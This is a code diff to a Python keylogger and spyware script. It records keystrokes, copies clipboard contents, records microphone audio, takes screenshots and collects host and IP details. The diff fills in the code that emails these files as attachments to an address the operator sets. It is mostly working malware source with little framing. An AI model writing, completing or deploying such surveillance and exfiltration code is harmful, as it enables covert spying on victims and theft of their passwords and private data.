@@ -6,12 +6,22 @@ Date: 05/08/2022
 
 # Libraries
 from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
 from email import encoders
+import smtplib
+import socket
+import platform
+import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
 import os
-from scipy.io.wav
-
+from scipy.io.wavfile import write
+import sounddevice as sd
+from cryptography.fernet import Fernet
+from requests import get
+from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
+from PIL import ImageGrab
 
 # Global Variables
 keys_info = "key_log.txt"
@@ -31,6 +41,9 @@ number_of_iterations_end = 3
 
 email_address = "example@domain.com" # Enter disposable email here
 password = "myPa55w0rd" # Enter email password here
+toaddr = " " # Enter the email address you want to send your information to
+key = " " # Generate an encryption key from the Cryptography folder
+file_path = " " # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
@@ -45,6 +58,8 @@ def send_email(filename, attachment, toaddr):
     body = "Body_of_the_mail"
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
+    attachment = open(attachment, 'rb')
+    p = MIMEBase('application', 'octet-stream')
     p.set_payload((attachment).read())
     encoders.encode_base64(p)
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
@@ -56,7 +71,8 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
 
-    send_email(keys_info, file_path + extend + keys_info, toaddr)
+send_email(keys_info, file_path + extend + keys_info, toaddr)
+
 
 # Get System Information
 def system_information():
@@ -69,13 +85,15 @@ def system_information():
         except Exception:
             f.write("Couldn't get Public IP Address (May be due to max query) \n")
 
+        f.write("Processor Info: " + (platform.processor()) + '\n')
         f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + IPAddr + '\n')
-        f.write("system_info: " + platfrom.system() + " " + platfrom.version() '\n')
 
 system_information()
 
+# Copy Clipboard Data
 def copy_clipboard():
     with open(file_merge + clipboard_info, "a") as f:
         try:
@@ -97,6 +115,7 @@ def microphone():
     write(file_merge + audio_info, fs, myrecording)
 
 microphone()
+
 
 # Get Screenshots
 def screenshots():
@@ -125,13 +144,14 @@ stoppingTime = time.time() + time_iteration
 while number_of_iterations < number_of_iterations_end:
     count = 0
     keys = []
+
     def on_press(key):
         global keys, count, currentTime
         print(key)
         keys.append(key)
         count += 1
         currentTime = time.time()
-        
+
         if count >= 1:
             count = 0
             write_file(keys)
